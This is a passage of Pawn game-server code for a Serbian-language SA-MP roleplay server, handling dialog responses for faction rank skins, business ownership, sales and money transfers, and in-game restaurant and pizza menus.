		if( PlayerInfo[ clan ][ xPol ] == 1 ) {
			if( rank == 1 ) { PlayerInfo[ clan ][ xSkin ] = OI[ OrgID ][ oSkin1 ]; PostaviSkin( clan, OI[ OrgID ][ oSkin1 ] ); }
			else if( rank == 2 ) { PlayerInfo[ clan ][ xSkin ] = OI[ OrgID ][ oSkin2 ]; PostaviSkin( clan, OI[ OrgID ][ oSkin2 ] ); }
		    else if( rank == 3 ) { PlayerInfo[ clan ][ xSkin ] = OI[ OrgID ][ oSkin3 ]; PostaviSkin( clan, OI[ OrgID ][ oSkin3 ] ); }
		    else if( rank == 4 ) { PlayerInfo[ clan ][ xSkin ] = OI[ OrgID ][ oSkin4 ]; PostaviSkin( clan, OI[ OrgID ][ oSkin4 ] ); }
		    else if( rank == 5 ) { PlayerInfo[ clan ][ xSkin ] = OI[ OrgID ][ oSkin5 ]; PostaviSkin( clan, OI[ OrgID ][ oSkin5 ] ); }
		    else if( rank == 6 ) { PlayerInfo[ clan ][ xSkin ] = OI[ OrgID ][ oSkin6 ]; PostaviSkin( clan, OI[ OrgID ][ oSkin6 ] ); }
   			
		}
		else if( PlayerInfo[ clan ][ xPol ] == 2 ) {
			if( rank == 1 ) { PlayerInfo[ clan ][ xSkin ] = OI[ OrgID ][ oZSkin1 ]; PostaviSkin( clan, OI[ OrgID ][ oZSkin1 ] ); }
			else if( rank == 2 ) { PlayerInfo[ clan ][ xSkin ] = OI[ OrgID ][ oZSkin2 ]; PostaviSkin( clan, OI[ OrgID ][ oZSkin2 ] ); }
		    else if( rank == 3 ) { PlayerInfo[ clan ][ xSkin ] = OI[ OrgID ][ oZSkin3 ]; PostaviSkin( clan, OI[ OrgID ][ oZSkin3 ] ); }
		    else if( rank == 4 ) { PlayerInfo[ clan ][ xSkin ] = OI[ OrgID ][ oZSkin4 ]; PostaviSkin( clan, OI[ OrgID ][ oZSkin4 ] ); }
		    else if( rank == 5 ) { PlayerInfo[ clan ][ xSkin ] = OI[ OrgID ][ oZSkin5 ]; PostaviSkin( clan, OI[ OrgID ][ oZSkin5 ] ); }
		    else if( rank == 6 ) { PlayerInfo[ clan ][ xSkin ] = OI[ OrgID ][ oZSkin6 ]; PostaviSkin( clan, OI[ OrgID ][ oZSkin6 ] ); }
   			
		}

		PlayerInfo[ clan ][ xRank ] = rank; SavePlayer( clan );
		SendInfoMessage( clan, "Lider te unapredio na rank %d!", rank );
		SendInfoMessage( playerid, "Unapredili ste igraca %s na rank %d!", ImeIgraca( clan ), rank );
	}
	else if( dialogid == dialog_FIRMA && response ) {
	    if( listitem == 0 ) {
			new string[256];
			new id = PlayerInfo[ playerid ][ xFirmaID ];
			format(string, sizeof(string), ""col_crvena"Ime Firme : "col_white"%s\n\n"col_crvena"Novac : "col_white"%d\n\n"col_crvena"Produkti : "col_white"%d/100", BussinesInfo[ id ][ bName ], BussinesInfo[ id ][ bMoney ], BussinesInfo[ id ][ bProducts ] );
			SPD( playerid, dialog_FINFO, DSMSG, D_NASLOV, string, D_ODABERI, D_ODUSTANI ); }
        if( listitem == 1 ) {
			SPD( playerid, dialog_FCNAME, DSI, D_NASLOV, "Molimo vas da unesete novo ime koje zelite.", D_ODABERI, D_ODUSTANI ); }
		if( listitem == 2 ) {
            SPD( playerid, dialog_FLOCK, DSMSG, D_NASLOV, "Molimo vas da odaberete da li zelite da ?", "Otkljucate", "Zakljucate" ); }
		if( listitem == 3 ) {
		    if( GetNearestBussines( playerid ) != PlayerInfo[ playerid ][ xFirmaID ] ) return SendErrorMessage( playerid, "Niste blizu ulaza firme!");
  			SPD( playerid, dialog_FPMONEY, DSI, D_NASLOV, "Molimo vas da unesete koliko zelite novca da podignete..", D_ODABERI, D_ODUSTANI ); }
		if( listitem == 4 ) {
  			if( GetNearestBussines( playerid ) != PlayerInfo[ playerid ][ xFirmaID ] ) return SendErrorMessage( playerid, "Niste blizu ulaza firme!");
			SPD( playerid, dialog_FOMONEY, DSI, D_NASLOV, "Molimo vas da unesete koliko zelite novca da ostavite...", D_ODABERI, D_ODUSTANI ); }
        if( listitem == 5 ) {
  			if( GetNearestBussines( playerid ) != PlayerInfo[ playerid ][ xFirmaID ] ) return SendErrorMessage( playerid, "Niste blizu ulaza firme!");

			if( BussinesInfo[ PlayerInfo[ playerid ][ xFirmaID ] ][ bType ] == VRSTA_GYM ||
				BussinesInfo[ PlayerInfo[ playerid ][ xFirmaID ] ][ bType ] == VRSTA_TRAFIKA ||
				BussinesInfo[ PlayerInfo[ playerid ][ xFirmaID ] ][ bType ] == VRSTA_ELEKTRONIK ||
				BussinesInfo[ PlayerInfo[ playerid ][ xFirmaID ] ][ bType ] == VRSTA_POSAO ||
				BussinesInfo[ PlayerInfo[ playerid ][ xFirmaID ] ][ bType ] == VRSTA_RENT ||
				BussinesInfo[ PlayerInfo[ playerid ][ xFirmaID ] ][ bType ] == VRSTA_PUMPA ||
				BussinesInfo[ PlayerInfo[ playerid ][ xFirmaID ] ][ bType ] == VRSTA_KLAD ||
				BussinesInfo[ PlayerInfo[ playerid ][ xFirmaID ] ][ bType ] == VRSTA_JFIRMA ) return SendErrorMessage( playerid, "Vasem tipu firme je podeseno automatsko postavljanje produkta!");

			SPD( playerid, dialog_FNPROD, DSI, D_NASLOV, "Molimo vas da unesete koliko zelite paketa produkta(10 produkta) da narucite", D_ODABERI, D_ODUSTANI ); }
		if( listitem == 6 ) {
   	 		if( PlayerInfo[ playerid ][ xFirmaID ] == -1 ) return SendErrorMessage( playerid, "Ne posedujes firmu!");
            if( GetNearestBussines( playerid ) != PlayerInfo[ playerid ][ xFirmaID ] ) return SendErrorMessage( playerid, "Niste blizu ulaza firme!");
    		SPD( playerid, dialog_FIRMASELLDRZAVA, DSMSG, D_NASLOV, "Da li ste sigurni da zelite prodati vasu firmu drzavi?", "Da", "Ne" );
		}
		if( listitem == 7 ) {
		    if( GetNearestBussines( playerid ) != PlayerInfo[ playerid ][ xFirmaID ] ) return SendErrorMessage( playerid, "Niste blizu ulaza firme!");
		    SPD( playerid, dialog_FIRMASELLTP, DSI, D_NASLOV, "U prazni prostor ispod unesite ID igraca i cenu firme", "Ponudi", D_ODUSTANI );
		}
	}
	else if( dialogid == dialog_FIRMASELLDRZAVA ) {
	    if( response ) {
	        new id = PlayerInfo[ playerid ][ xFirmaID ];
   	 		if( PlayerInfo[ playerid ][ xFirmaID ] == -1 ) return SendErrorMessage( playerid, "Ne posedujes firmu!");
            if(ProdajeImovinu[playerid]) return SendErrorMessage(playerid, "Ne mozes to dok cekas odgovor od igraca na kupovinu!");
            if( GetNearestBussines( playerid ) != PlayerInfo[ playerid ][ xFirmaID ] ) return SendErrorMessage( playerid, "Niste blizu ulaza firme!");
			if( PlayerInfo[ playerid ][ xBRacun ] < 0 ) return SendErrorMessage( playerid, "Ne mozes da prodas firmu dok ne izadjes iz minusa u banci." );
            new string1[ 128 ]; 
			format( string1, sizeof( string1 ), "Igrac %s je prodao firmu ID %d na buy", ImeIgraca( playerid ), id );
			LogSave( "Ostalo/LogProdajaImovine.log", string1 );

			BussinesInfo[ id ][ bOwned ] = 0;
			BussinesInfo[ id ][ bNeaktivnost ] = 0;
    		strmid( BussinesInfo[ id ][ bOwner], "Drzava", 0, strlen( "Drzava" ), 32);
    		BussinesInfo[ id ][ bLocked ] = 1;
    		DajIgracuNovac( playerid, BussinesInfo[ id ][ bPrice ]/2 );
    		PlayerInfo[ playerid ][ xFirmaID ] = -1;
    		SaveBussines( id );
    		SendInfoMessage( playerid, "Firma uspesno prodana!" );
    		Bussines_Refresh( id );
    		SavePlayer( playerid );
		}
		if( !response ) {
		    SCM( playerid, -1, "Odustali ste od prodaje firme drzavi." );
		}
	}
	else if( dialogid == dialog_FIRMASELLTP ) {
	    if( !response ) return 1;
	    if( response ) {
	        if( PlayerInfo[ playerid ][ xBRacun ] < 0 ) return SendErrorMessage( playerid, "Ne mozes da prodas firmu dok ne izadjes iz minusa u banci." );
	        new id = PlayerInfo[ playerid ][ xFirmaID ];
	        new idigraca, cena, string[ 128 ], Float:Pos[ 3 ];
	        if( sscanf( inputtext, "ui", idigraca, cena ) ) return SPD( playerid, dialog_FIRMASELLTP, DSI, D_NASLOV, "U prazni prostor ispod unesite ID igraca i cenu firme", "Ponudi", D_ODUSTANI );
            GetPlayerPos( idigraca, Pos[0], Pos[1], Pos[2] );
			if( !IsPlayerInRangeOfPoint( playerid, 3.0, Pos[0], Pos[1], Pos[2] ) ) return SendErrorMessage( playerid, "Igrac nije blizu vas");
			if( cena < 1 ) return SendErrorMessage( playerid, "Cena ne moze biti manja od 1$!");
			if( idigraca == IPI ) return SendErrorMessage( playerid, "Pogresan ID." );
			if( idigraca == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebi prodati firmu!");
			if( PlayerInfo[ idigraca ][ xFirmaID ] != -1 )return SendErrorMessage( playerid, "Igrac vec ima firmu!");
            if( PlayerInfo[ idigraca ][ xLevel ] < BussinesInfo[ id ][ bLevel ] ) return SendClientMessageEx( playerid, CRVENA, "Igrac mora biti level %d+ da bi ste mu prodali firmu.", BussinesInfo[ id ][ bLevel ] );
			SendClientMessageEx( playerid, SVETLOPLAVA, "Ponudili ste igracu %s firmu po ceni od %d.", ImeIgraca( idigraca ), cena );
			GlobalProdaja[ idigraca ] = playerid;
			GlobalCena[ idigraca ] = cena;
            ProdajeImovinu[playerid] = true;
			format( string, sizeof( string ), "Igrac %s vam je ponudio da kupite njegovu firmu za %d", ImeIgraca( playerid ), cena );
			SPD( idigraca, dialog_ACCEPTFRIMA, DSMSG, D_NASLOV, string, "Prihvati", "Odbij" );
	    }
	}
	else if( dialogid == dialog_ACCEPTFRIMA ) {
	    if( response ) {
	        new id = PlayerInfo[ GlobalProdaja[ playerid ] ][ xFirmaID ];
	        if( PlayerInfo[ playerid ][ xNovac ] < GlobalCena[ playerid ] ) return SendErrorMessage( playerid, "Nemate dovoljno novca.");

            new string1[ 128 ]; 
			format( string1, sizeof( string1 ), "Igrac %s je prodao firmu ID %d igracu %s za %d", ImeIgraca( GlobalProdaja[ playerid ] ), id, ImeIgraca( playerid ), GlobalCena[ playerid ] );
			LogSave( "Ostalo/LogProdajaImovine.log", string1 );

			SendClientMessageEx( playerid, SVETLOPLAVA, "Uspesno ste kupili firmu od igraca %s za $d.", ImeIgraca( GlobalProdaja[ playerid ] ), GlobalCena[ playerid ] );

			PlayerInfo[ GlobalProdaja[ playerid ] ][ xFirmaID ] = -1;
			PlayerInfo[ playerid ][ xFirmaID ] = id;
			strmid( BussinesInfo[ id ][ bOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
			SaveBussines( id ); Bussines_Refresh( id );
			SavePlayer( playerid ); SavePlayer( GlobalProdaja[ playerid ] );
			format( globalstring, sizeof( globalstring ), "Prodali ste firmu igracu %s za %d!", ImeIgraca( playerid ), GlobalCena[ playerid ] );
			SCM( GlobalProdaja[ playerid ], -1, globalstring );
			DajIgracuNovac( GlobalProdaja[ playerid ], GlobalCena[ playerid ] );
			DajIgracuNovac( playerid, -GlobalCena[ playerid ] );
			SCM( playerid, -1, "Kupili ste firmu!" );
            ProdajeImovinu[GlobalProdaja[playerid]] = false;
			GlobalProdaja[ playerid ] = -1;
			GlobalCena[ playerid ] = -1;
	    }
	    else if( !response ) {
			format( globalstring, sizeof( globalstring ),"Igrac %s je odbio vasu ponudu za kupovinu firme!", ImeIgraca( playerid ) );
			SCM( GlobalProdaja[ playerid ], -1, globalstring );
			SCM( playerid, -1, "Odbili ste ponudu!");
            ProdajeImovinu[GlobalProdaja[playerid]] = false;
			GlobalProdaja[ playerid ] = -1;
			GlobalCena[ playerid ] = -1;
	    }
	}
	else if( dialogid == dialog_FLOCK ) { 
        new id = GetNearestBussines( playerid );
        if( id != PlayerInfo[ playerid ][ xFirmaID ]) return SendErrorMessage( playerid, "Ovo nije tvoja firma");
  		if( response ) {
            BussinesInfo[ id ][ bLocked ] = 0;
        	GameTextForPlayer( playerid, "Firma ~g~otkljucana!", 3000, 3 );
        	SaveBussines( id ); }
		else {
		    BussinesInfo[ id ][ bLocked ] = 1;
        	GameTextForPlayer( playerid, "Firma ~r~zakljucana!", 3000, 3 );
        	SaveBussines( id ); }
	}
	else if( dialogid == dialog_FCNAME && response ) {
	    new IDFirme = PlayerInfo[ playerid ][ xFirmaID ], imefirme[64];
        if( IDFirme == -1 ) return SendErrorMessage( playerid, "Ne posedujes firmu!");
        if( sscanf( inputtext, "s[64]", imefirme ) ) return SPD( playerid, dialog_FCNAME, DSI, D_NASLOV, "Molimo vas da unesete novo ime koje zelite.", D_ODABERI, D_ODUSTANI );
		strmid( BussinesInfo[ IDFirme ][ bName ], imefirme, 0, strlen( imefirme ), 64);
		SaveBussines( IDFirme ); Bussines_Refresh( IDFirme );
		SendInfoMessage( playerid, "Uspesno si promenio ime firme." );
	}
	else if( dialogid == dialog_FNPROD && response ) {
	    new IDFirme = PlayerInfo[ playerid ][ xFirmaID ], kolicina, cena;
        if( IDFirme == -1 ) return SendErrorMessage( playerid, "Ne posedujes firmu!");
        if( sscanf( inputtext, "i", kolicina ) ) return SPD( playerid, dialog_FNPROD, DSI, D_NASLOV, "Molimo vas da unesete koliko zelite paketa produkta(10 produkta po paketu) da narucite", D_ODABERI, D_ODUSTANI );
        if(kolicina < 1 || kolicina > 10) return SPD( playerid, dialog_FNPROD, DSI, D_NASLOV, "Ne mozete manje od 1 ili vise od 10\nMolimo vas da unesete koliko zelite paketa produkta(10 produkta po paketu) da narucite", D_ODABERI, D_ODUSTANI );
        if(BussinesInfo[ IDFirme ][ bType ] == VRSTA_CASINO) return SendErrorMessage(playerid, "Vasoj Firmi ne trebaju produkti!");
        if( BussinesInfo[ IDFirme ][ bType ] == VRSTA_BAR || BussinesInfo[ IDFirme ][ bType ] == VRSTA_DISCO || BussinesInfo[ IDFirme ][ bType ] == VRSTA_NKLUB || BussinesInfo[ IDFirme ][ bType ] == VRSTA_JAVNAK )
		{
			cena = CARGO_PICE_PRICE;
		}
		else if( BussinesInfo[ IDFirme ][ bType ] == VRSTA_RESTORAN || BussinesInfo[ IDFirme ][ bType ] == VRSTA_CLUCK )
		{
            cena = CARGO_MESO_PRICE;
		}
		else if( BussinesInfo[ IDFirme ][ bType ] == VRSTA_BINCO || BussinesInfo[ IDFirme ][ bType ] == VRSTA_VICTIM || BussinesInfo[ IDFirme ][ bType ] == VRSTA_ZIP || BussinesInfo[ IDFirme ][ bType ] == VRSTA_SUBURBAN )
		{
            cena = CARGO_PAMUK_PRICE;
		}
		else if( BussinesInfo[ IDFirme ][ bType ] == VRSTA_GUNSHOP )
		{
            cena = CARGO_BARUT_PRICE;
		}
		else if( BussinesInfo[ IDFirme ][ bType ] == VRSTA_PIZZA )
		{
            cena = CARGO_JAJA_PRICE;
		}
		else if( BussinesInfo[ IDFirme ][ bType ] == VRSTA_MARKET || BussinesInfo[ IDFirme ][ bType ] == VRSTA_BURG )
		{
            cena = CARGO_HRANA_PRICE;
		}
		if( (BussinesInfo[ IDFirme ][ bProducts ]+kolicina) > 110 ) return SendErrorMessage( playerid, "Kolicina produkta koje narucujete sa trenutnim brojem produkata ne moze ici preko maximuma(110 produkta)." );
        new ukupno = cena*kolicina;
        if(BussinesInfo[IDFirme][bMoney] < ukupno) return SendErrorMessage(playerid, "Nemas toliko novca u sefu firme!");
		BussinesInfo[ IDFirme ][ bProducts ] += kolicina;
        BussinesInfo[ IDFirme ][ bMoney ] -= ukupno;
		SaveBussines( IDFirme );
		SendInfoMessage( playerid, "Uspesno si narucio %d produkata za %d$! Sada imas %d!", kolicina, ukupno, BussinesInfo[IDFirme][bProducts]);
	}
	else if( dialogid == dialog_FOMONEY ) {
		if( !response ) return true;
		if( response )
		{
			new iznos, IDFirme = PlayerInfo[ playerid ][ xFirmaID ];
			if( sscanf(inputtext, "i", iznos)) return SendErrorMessage( playerid, "Niste uneli kolicinu novca za ostavljanje!");
			if( iznos < 1 || iznos > 1000000) return SendErrorMessage( playerid, "Kolicina novca ne moze biti ispod 1 i iznad 1.000.000$!");
            if( iznos > PlayerInfo[ playerid  ][ xNovac ] ) return SendErrorMessage( playerid, "Nemate toliko novca kod sebe!");
			DajIgracuNovacSpeech( playerid, -iznos ); BussinesInfo[ IDFirme ][ bMoney ] += iznos;
			SendInfoMessage( playerid, "Ostavili ste %d$ u kasu firme!", iznos );
		    SaveBussines( IDFirme );
			SavePlayer( playerid ); }
	}
	else if( dialogid == dialog_FPMONEY ) {
		if( !response ) return true;
		if( response ) {
			new iznos, IDFirme = PlayerInfo[ playerid ][ xFirmaID ];
			if( sscanf(inputtext, "i", iznos)) return SendErrorMessage( playerid, "Niste uneli kolicinu novca za ostavljanje!");
			if( iznos < 1 || iznos > 1000000) return SendErrorMessage( playerid, "Kolicina novca ne moze biti ispod 1 i iznad 1.000.000!");
            if( iznos > BussinesInfo[ IDFirme ][ bMoney ] ) return SendErrorMessage( playerid, "Nemate toliko novca u kasi!");
			DajIgracuNovacSpeech( playerid, iznos ); BussinesInfo[ IDFirme ][ bMoney ] -= iznos;
			SendInfoMessage( playerid, "Podigli ste %d$ iz kase firme!", iznos );
		    SaveBussines( IDFirme );
			SavePlayer( playerid );
		}
	}
	else if( dialogid == dialog_RESTORAN ) {
		if( !response ) return 1;
		if( BussinesInfo[ uFirmi[ playerid ] ][ bProducts ] <= 0 ) return SendErrorMessage( playerid, "Nemamo vise proizvoda!");
		new string[50];
		switch( listitem ) {
			case 0: {
				if( PlayerInfo[ playerid ][ xNovac ] < 150) return SendErrorMessage( playerid, "Nemate dovoljno novca 150$!");
				BussinesMoney( uFirmi[ playerid ] , 90 );
				DajIgracuNovac( playerid, -150 );
				BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				format(string, sizeof(string), "* %s jede juhu.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, string, LJUBICASTA );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
			case 1: {
				if( PlayerInfo[ playerid ][ xNovac ] < 220) return SendErrorMessage( playerid, "Nemate dovoljno novca 220$!");
				BussinesMoney( uFirmi[ playerid ] , 90 );
				DajIgracuNovac( playerid, -220 );
				BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				format(string, sizeof(string), "* %s jede Piletinu.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, string, LJUBICASTA );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
			case 2:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 350) return SendErrorMessage( playerid, "Nemate dovoljno novca 350$!");
				BussinesMoney( uFirmi[ playerid ] , 90 );
				DajIgracuNovac( playerid, -350 );
				BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				format(string, sizeof(string), "* %s jede pecenog morskog psa na salati.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, string, LJUBICASTA );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
		    case 3:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 410) return SendErrorMessage( playerid, "Nemate dovoljno novca 410$!");
				BussinesMoney( uFirmi[ playerid ] , 120 );
				DajIgracuNovac( playerid, -410);
				BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				format(string, sizeof(string), "* %s jede spagete.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, string, LJUBICASTA );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
		    case 4:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 630) return SendErrorMessage( playerid, "Nemate dovoljno novca 630$!");
				BussinesMoney( uFirmi[ playerid ] , 130 );
				DajIgracuNovac( playerid, -630 );
				format(string, sizeof(string), "* %s jede kolac.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, string, LJUBICASTA );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
		    case 5:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 50) return SendErrorMessage( playerid, "Nemate dovoljno novca 50$!");
				BussinesMoney( uFirmi[ playerid ] , 50 );
				DajIgracuNovac( playerid, -50 );
				BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				format(string, sizeof(string), "* %s pije coca colu.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, string, LJUBICASTA );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_SPRUNK);
			}
			case 6:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 25) return SendErrorMessage( playerid, "Nemate dovoljno novca 25$!");
				BussinesMoney( uFirmi[ playerid ] , 10 );
				DajIgracuNovac( playerid, -25 );
				format(string, sizeof(string), "* %s pije vodu.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, string, LJUBICASTA );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_SPRUNK);
			}
		}
	}
	else if( dialogid == dialog_CLUCKIN)
	{
		if( !response ) return 1;
		if(BussinesInfo[ uFirmi[ playerid ] ][ bProducts ] <= 0) return SendErrorMessage( playerid, "Nemamo vise proizvoda!");
		new string[50];
		switch( listitem )
		{
			case 0:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 100) return SendErrorMessage( playerid, "Nemate dovoljno novca 100$!");
				BussinesMoney( uFirmi[ playerid ], 90 );
				DajIgracuNovac( playerid, -100 );
				BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				format(string, sizeof(string), "* %s jede Topli Sendvic.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, string, LJUBICASTA );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
				SavePlayer( playerid );
			}
			case 1:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 150) return SendErrorMessage( playerid, "Nemate dovoljno novca 150$!");
				BussinesMoney( uFirmi[ playerid ], 110 );
				DajIgracuNovac( playerid, -150 );
				BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				format(string, sizeof(string), "* %s jede Cevape.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, string, LJUBICASTA );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
			}
			case 2:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 100) return SendErrorMessage( playerid, "Nemate dovoljno novca 100$!");
				BussinesMoney( uFirmi[ playerid ], 90 );
				DajIgracuNovac( playerid, -100 );
				BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				format(string, sizeof(string), "* %s jede Filete.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, string, LJUBICASTA );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
				SavePlayer( playerid );
			}
			case 3:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 100) return SendErrorMessage( playerid, "Nemate dovoljno novca 100$!");
				BussinesMoney( uFirmi[ playerid ], 100 );
				DajIgracuNovac( playerid, -100 );
				format(string, sizeof(string), "* %s jede Vocnu salatu.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, string, LJUBICASTA );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
				SavePlayer( playerid );
			}
		    case 4:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 120) return SendErrorMessage( playerid, "Nemate dovoljno novca 120$!");
				BussinesMoney( uFirmi[ playerid ], 110 );
				DajIgracuNovac( playerid, -120 );
				BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				format(string, sizeof(string), "* %s jede Kebab.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, string, LJUBICASTA );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
				SavePlayer( playerid );
			}
			case 5:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 50) return SendErrorMessage( playerid, "Nemate dovoljno novca 50$!");
				BussinesMoney( uFirmi[ playerid ], 50 );
				DajIgracuNovac( playerid, -50 );
				BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				format(string, sizeof(string), "* %s pije sprite.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, string, LJUBICASTA );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_SPRUNK);
				SavePlayer( playerid );
			}
			case 6:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 25 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 25$!");
				BussinesMoney( uFirmi[ playerid ], 10 );
				DajIgracuNovac( playerid, -25 );
				format(string, sizeof(string), "* %s pije vodu.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, string, LJUBICASTA );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_SPRUNK);
				SavePlayer( playerid );
			}
		}
	}
	else if( dialogid == dialog_PIZZA)
	{
		if( !response ) return 1;
		if( BussinesInfo[ uFirmi[ playerid ] ][ bProducts ] <= 0) return SendErrorMessage( playerid, "Nemamo vise proizvoda!");
		BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
		new string[50];
		switch( listitem )
		{
			case 0:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 100) return SendErrorMessage( playerid, "Nemate dovoljno novca 100$!");
				BussinesMoney( uFirmi[ playerid ] , 100);
				DajIgracuNovac( playerid, -100 );
				BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				format(string, sizeof(string), "* %s jede Pizzetu.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, string, LJUBICASTA );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
				SavePlayer( playerid );
			}
			case 1:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 150) return SendErrorMessage( playerid, "Nemate dovoljno novca 150$!");
				BussinesMoney( uFirmi[ playerid ] , 150);
				DajIgracuNovac( playerid, -150 );
				BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				format(string, sizeof(string), "* %s jede Veliku pizzu.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, string, LJUBICASTA );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
				SavePlayer( playerid );
			}
			case 2:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 45) return SendErrorMessage( playerid, "Nemate dovoljno novca 45$!");
				BussinesMoney( uFirmi[ playerid ] , 40);
				DajIgracuNovac( playerid, -45 );
				BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				format(string, sizeof(string), "* %s jede Topli sendvic.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, string, LJUBICASTA );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
				SavePlayer( playerid );
			}
			case 3:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 40) return SendErrorMessage( playerid, "Nemate dovoljno novca 40$!");
				BussinesMoney( uFirmi[ playerid ] , 40);
				DajIgracuNovac( playerid, -40 );
				format(string, sizeof(string), "* %s jede salatu.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, string, LJUBICASTA );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
				SavePlayer( playerid );
			}
		   	case 4:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 250) return SendErrorMessage( playerid, "Nemate dovoljno novca 250$!");
				BussinesMoney( uFirmi[ playerid ] , 230);
				DajIgracuNovac( playerid, -250 );
				BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				format(string, sizeof(string), "* %s jede Jumbo Pizzu.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, string, LJUBICASTA );
			    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
				SavePlayer( playerid );
			}
		    case 5:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 50) return SendErrorMessage( playerid, "Nemate dovoljno novca 50$!");
				BussinesMoney( uFirmi[ playerid ] , 45);
				DajIgracuNovac( playerid, -50 );
				BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				format(string, sizeof(string), "* %s pije Sprite.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, string, LJUBICASTA );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_SPRUNK);
				SavePlayer( playerid );
			}
			case 6:
			{
				if( PlayerInfo[ playerid ][ xNovac ] < 25) return SendErrorMessage( playerid, "Nemate dovoljno novca 25$!");
				BussinesMoney( uFirmi[ playerid ] , 20);
				DajIgracuNovac( playerid, -25 );
				format(string, sizeof(string), "* %s pije vodu.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, string, LJUBICASTA );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_SPRUNK);
				SavePlayer( playerid );
			}
		}
	}
	else if( dialogid == dialog_DRINK ) {
	    new drunklevel = GetPlayerDrunkLevel( playerid );
		if( !response ) return 1;
		if( uFirmi[ playerid ] != -1 ) if( BussinesInfo[ uFirmi[ playerid ] ][ bProducts ] <= 0) return SendErrorMessage( playerid, "Nemamo vise proizvoda!");
		switch( listitem ) {
			case 0: {
